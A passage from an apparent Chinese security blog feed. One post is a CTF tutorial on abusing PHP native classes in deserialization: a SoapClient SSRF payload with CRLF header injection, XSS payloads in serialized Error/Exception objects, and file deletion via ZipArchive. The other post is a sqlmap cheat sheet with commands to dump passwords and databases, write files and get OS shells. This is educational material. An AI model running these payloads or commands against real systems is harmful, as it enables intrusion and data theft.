        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20210730004421.png" loading="lazy"><br>本文首发安全客<br>原创发布地址————<a href="https://www.anquanke.com/post/id/247647">浅谈PHP原生类反序列化</a></p><a id="more"></a><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>在CTF中反序列化类型的题目还是比较常见的，之前有学习过简单的反序列化，以及简单pop链的构造。这次学习内容为php内置的原生类的反序列化以及一点进阶知识。<br>在题目给的的代码中找不到可利用的类时，这个时候考虑使用php中的一些原生类有些类不一定能够进行反序列化，php中使用了<code>zend_class_unserialize_deny</code>来禁止一些类的反序列化。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>原生类常见的用法是用来进行XSS、SSRF、反序列化、或者XXE，今天就来好好总结一下。<br>在CTF中常使用到的原生类有这几类<br>1、Error<br>2、Exception<br>3、SoapClient<br>4、DirectoryIterator<br>5、SimpleXMLElement<br>下面针对这几个类来进行总结。</p><h2 id="SoapClient-call方法进行SSRF"><a href="#SoapClient-call方法进行SSRF" class="headerlink" title="SoapClient __call方法进行SSRF"></a>SoapClient __call方法进行SSRF</h2><h3 id="soap是什么？"><a href="#soap是什么？" class="headerlink" title="soap是什么？"></a>soap是什么？</h3><p>soap是webServer的三要素之一(SOAP、WSDL、UDDI)，WSDL用来描述如何访问具体的接口，UUDI用来管理、分发、查询webServer，SOAP是连接web服务和客户端的接口，SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息。<br>所以它的使用条件为：<br>1.需要有soap扩展，需要手动开启该扩展。<br>2.需要调用一个不存在的方法触发其__call()函数。<br>3.仅限于http/https协议</p><h3 id="php中的soapClient类"><a href="#php中的soapClient类" class="headerlink" title="php中的soapClient类"></a>php中的soapClient类</h3><p>类摘要：<a href="https://www.php.net/manual/zh/class.soapclient.php">PHP手册</a></p><pre class="language-php" data-language="php"><code class="language-php">SoapClient <span class="token punctuation">&#123;</span><span class="token comment">/* 方法 */</span><span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span>string<span class="token operator">|</span><span class="token constant">null</span> <span class="token variable">$wsdl</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token function">__call</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">:</span> mixed<span class="token keyword">public</span> <span class="token function">__doRequest</span><span class="token punctuation">(</span>    string <span class="token variable">$request</span><span class="token punctuation">,</span>    string <span class="token variable">$location</span><span class="token punctuation">,</span>    string <span class="token variable">$action</span><span class="token punctuation">,</span>    int <span class="token variable">$version</span><span class="token punctuation">,</span>    bool <span class="token variable">$oneWay</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token operator">|</span><span class="token constant">null</span><span class="token keyword">public</span> <span class="token function">__getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">array</span><span class="token keyword">public</span> <span class="token function">__getFunctions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">array</span><span class="token operator">|</span><span class="token constant">null</span><span class="token keyword">public</span> <span class="token function">__getLastRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token operator">|</span><span class="token constant">null</span><span class="token keyword">public</span> <span class="token function">__getLastRequestHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token operator">|</span><span class="token constant">null</span><span class="token keyword">public</span> <span class="token function">__getLastResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token operator">|</span><span class="token constant">null</span><span class="token keyword">public</span> <span class="token function">__getLastResponseHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token operator">|</span><span class="token constant">null</span><span class="token keyword">public</span> <span class="token function">__getTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">array</span><span class="token operator">|</span><span class="token constant">null</span><span class="token keyword">public</span> <span class="token function">__setCookie</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">,</span> string<span class="token operator">|</span><span class="token constant">null</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> void<span class="token keyword">public</span> <span class="token function">__setLocation</span><span class="token punctuation">(</span>string<span class="token operator">|</span><span class="token constant">null</span> <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token operator">|</span><span class="token constant">null</span><span class="token keyword">public</span> <span class="token function">__setSoapHeaders</span><span class="token punctuation">(</span>SoapHeader<span class="token operator">|</span><span class="token keyword">array</span><span class="token operator">|</span><span class="token constant">null</span> <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token keyword">public</span> <span class="token function">__soapCall</span><span class="token punctuation">(</span>    string <span class="token variable">$name</span><span class="token punctuation">,</span>    <span class="token keyword">array</span> <span class="token variable">$args</span><span class="token punctuation">,</span>    <span class="token keyword">array</span><span class="token operator">|</span><span class="token constant">null</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span>    SoapHeader<span class="token operator">|</span><span class="token keyword">array</span><span class="token operator">|</span><span class="token constant">null</span> <span class="token variable">$inputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span>    <span class="token keyword">array</span> <span class="token operator">&amp;</span><span class="token variable">$outputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> mixed<span class="token punctuation">&#125;</span></code></pre><p>注意这个<code>__call()</code>方法<code>public __call(string $name, array $args): mixed</code><br>该方法被触发的时候，它可以发送HTTP或HTTPS请求。<br>使用这个类时，php中的scapClient类可以创建soap数据报文，与wsdl接口进行交互。用法如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> SoapClient<span class="token punctuation">:</span><span class="token punctuation">:</span>SoapClient <span class="token punctuation">(</span> mixed <span class="token variable">$wsdl</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$options</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span>第一个参数是用来指明是否是wsdl模式如果为<span class="token constant">null</span>，那就是非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求如果第一个参数为<span class="token constant">null</span>，则第二个参数必须设置location和uri    其中location是将请求发送到的<span class="token constant">SOAP</span>服务器的<span class="token constant">URL</span>    uri是<span class="token constant">SOAP</span>服务的目标名称空间第二个参数允许设置user_agent选项来设置请求的user<span class="token operator">-</span>agent头</code></pre><p>测试</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'http://47.xxx.xxx.72:2333/aaa'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'uri'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'http://47.xxx.xxx.72:2333'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><span class="token delimiter important">?></span></span></code></pre><p>kali开启监听<code>nc -lvp 4444</code>，执行该文件。【注意开启soap模块】<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210718203614.png" loading="lazy"><br>kali中就会返回监听到的内容<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210718203801.png" loading="lazy"></p><h3 id="一道CTF题目"><a href="#一道CTF题目" class="headerlink" title="一道CTF题目"></a>一道CTF题目</h3><pre class="language-php" data-language="php"><code class="language-php">#index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#flag.php</span><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>这道题目就是利用的PHP原生类进行反序列化来实现SSRF，因为在这里是没有给出可利用的类，所以就需要使用原生类。<br>在解答此题的过程中，还需要利用到<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF</a>，文章很详细，容易理解。<br>CRLF是<code>回车 + 换行（\r\n）</code>的简称，进行url编码后是<code>%0a%0d%0a%0d</code><br>这道题的思路就是<br>先利用<code>ssrf</code>访问<code>flag.php</code>然后post一个数据 <code>toke=ctfshow</code>和请求头<code>X-Forwarded-For</code> 就能把<code>flag</code>写到<code>flag.txt</code>中了。<br>用到<code>SoapClient</code>类了。这个类中有个<code>__call</code>魔术方法，触发时会调用<code>SoapClient</code>类的构造方法。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'test^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'^^Content-Length: '</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'^^^^'</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'uri'</span><span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'^^'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>使用get传入vip的参数即可。然后访问flag.txt就可以得到flag了。此处无报错，即是成功。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210719004840.png" loading="lazy"></p><h2 id="使用-Error-Exception-内置类来构造-XSS。"><a href="#使用-Error-Exception-内置类来构造-XSS。" class="headerlink" title="使用 Error/Exception 内置类来构造 XSS。"></a>使用 Error/Exception 内置类来构造 XSS。</h2><pre class="language-php" data-language="php"><code class="language-php">#index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p><code>Error</code>类是php的一个内置类，用于自动自定义一个<code>Error</code>，在<code>php7</code>的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;script>alert('xss')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter important">?></span></span>#output:O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A30%3A%22%3Cscript%3Ealert%28%27test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A30%3A%22D%3A%5CphpStudy%5CWWW%5Cm0re%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210719012915.png" loading="lazy"><br>另一种，<code>Exception</code> 内置类，与上述类似，只是换了一个类，将<code>Error</code>换成了<code>Exception</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;script>alert('xss')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter important">?></span></span></code></pre><p>其它与上述相同。</p><h1 id="实例化任意类"><a href="#实例化任意类" class="headerlink" title="实例化任意类"></a>实例化任意类</h1><h2 id="ZipArchive-open-删除文件"><a href="#ZipArchive-open-删除文件" class="headerlink" title="ZipArchive::open 删除文件"></a>ZipArchive::open 删除文件</h2><p>使用条件：open参数可控。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.php'</span><span class="token punctuation">,</span>ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖</span><span class="token comment">// 因为没有保存，所以效果就是删除了test.php</span></code></pre><p>在同目录下创建一个<code>test.php</code>。然后执行上面的代码，就会发现<code>test.php</code>已经被删除了。</p><h2 id="SQLite3-创建空白文件"><a href="#SQLite3-创建空白文件" class="headerlink" title="SQLite3 创建空白文件"></a>SQLite3 创建空白文件</h2><p>前提：需要有sqlite3扩展，且不是默认开启，需要手动开启</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210719015446.png" loading="lazy"></p><h2 id="GlobIterator-遍历目录"><a href="#GlobIterator-遍历目录" class="headerlink" title="GlobIterator 遍历目录"></a>GlobIterator 遍历目录</h2><pre class="language-php" data-language="php"><code class="language-php">GlobIterator<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span>string <span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>int <span class="token variable">$flag</span><span class="token punctuation">]</span><span class="token punctuation">)</span>从使用<span class="token variable">$pattern</span>构造一个新的目录迭代</code></pre><p>示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$newclass</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"./*.php"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$newclass</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'=>'</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210719015707.png" loading="lazy"></p><p>SimpleXMLElement暂无示例。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>PHP反序列化的一些原生类的基础知识暂时学习到这里，后面关于PHP反序列化的还有phar反序列化，session反序列化。慢慢来吧。</p><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><p><a href="https://cn-sec.com/archives/286121.html">https://cn-sec.com/archives/286121.html</a><br><a href="https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8">https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用学习</title>
      <link href="/posts/e63eb101/"/>
      <url>/posts/e63eb101/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/beautiful.jpg" loading="lazy"><br>盛不盛开，花都是花。有你没你，我都是我。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>暑假开始，学习跟上……..<br>之前只学习了SQLmap的基本使用，没有及进行详细的学习。所以考完试后第一时间就来进行这一块儿内容的学习。</p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -r http.txt  <span class="token comment">#http.txt是我们抓取的http的请求包</span>sqlmap -r http.txt -p username  <span class="token comment">#指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测</span>sqlmap -u <span class="token string">"http://www.xx.com/username/admin*"</span>       <span class="token comment">#如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span>   <span class="token comment">#探测该url是否存在漏洞</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span>   --cookie<span class="token operator">=</span><span class="token string">"抓取的cookie"</span>   <span class="token comment">#当该网站需要登录时，探测该url是否存在漏洞</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span>  --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin&amp;submit=Submit"</span>  <span class="token comment">#抓取其post提交的数据填入</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> --users      <span class="token comment">#查看数据库的所有用户</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> --passwords  <span class="token comment">#查看数据库用户名的密码</span>有时候使用 --passwords 不能获取到密码，则可以试下-D mysql -T user -C host,user,password --dump  当MySQL<span class="token operator">&lt;</span> <span class="token number">5.7</span>时-D mysql -T user -C host,user,authentication_string --dump  当MySQL<span class="token operator">></span><span class="token operator">=</span> <span class="token number">5.7</span>时sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> --current-user  <span class="token comment">#查看数据库当前的用户</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> --is-dba    <span class="token comment">#判断当前用户是否有管理员权限</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> --roles     <span class="token comment">#列出数据库所有管理员角色，仅适用于oracle数据库的时候</span> sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span>    --dbs        <span class="token comment">#爆出所有的数据库</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span>    --tables     <span class="token comment">#爆出所有的数据表</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span>    --columns    <span class="token comment">#爆出数据库中所有的列</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span>    --current-db <span class="token comment">#查看当前的数据库</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> -D security --tables <span class="token comment">#爆出数据库security中的所有的表</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> --columns <span class="token comment">#爆出security数据库中users表中的所有的列</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> -C username --dump  <span class="token comment">#爆出数据库security中的users表中的username列中的所有数据</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> -C username --dump --start <span class="token number">1</span> --stop <span class="token number">100</span>  <span class="token comment">#爆出数据库security中的users表中的username列中的前100条数据</span> sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> --dump-all <span class="token comment">#爆出数据库security中的users表中的所有数据</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> -D security --dump-all   <span class="token comment">#爆出数据库security中的所有数据</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> --dump-all  <span class="token comment">#爆出该数据库中的所有数据</span> sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span>  --tamper<span class="token operator">=</span>space2comment.py  <span class="token comment">#指定脚本进行过滤，用/**/代替空格</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --level<span class="token operator">=</span><span class="token number">5</span> --risk<span class="token operator">=</span><span class="token number">3</span> <span class="token comment">#探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-1/?id=1"</span> --sql-shell  <span class="token comment">#执行指定的sql语句</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --os-shell/--os-cmd   <span class="token comment">#执行--os-shell命令，获取目标服务器权限</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --os-pwn   <span class="token comment">#执行--os-pwn命令，将目标权限弹到MSF上</span> sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --file-read <span class="token string">"c:/test.txt"</span> <span class="token comment">#读取目标服务器C盘下的test.txt文件</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --file-write  test.txt  --file-dest <span class="token string">"e:/hack.txt"</span>  <span class="token comment">#将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span> sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --dbms<span class="token operator">=</span><span class="token string">"MySQL"</span>     <span class="token comment">#指定其数据库为mysql </span>其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDBsqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --random-agent   <span class="token comment">#使用任意的User-Agent爆破</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --proxy<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8080"</span>    <span class="token comment">#指定代理</span>当爆破HTTPS网站会出现超时的话，可以使用参数 --delay<span class="token operator">=</span><span class="token number">3</span> --force-sslsqlmap -u <span class="token string">"http://192.168.137.1/sqli/Less-4/?id=1"</span> --technique T    <span class="token comment">#指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。</span>支持的探测方式如下：　　B: Boolean-based blind SQL injection（布尔型注入）　　E: Error-based SQL injection（报错型注入）　　U: UNION query SQL 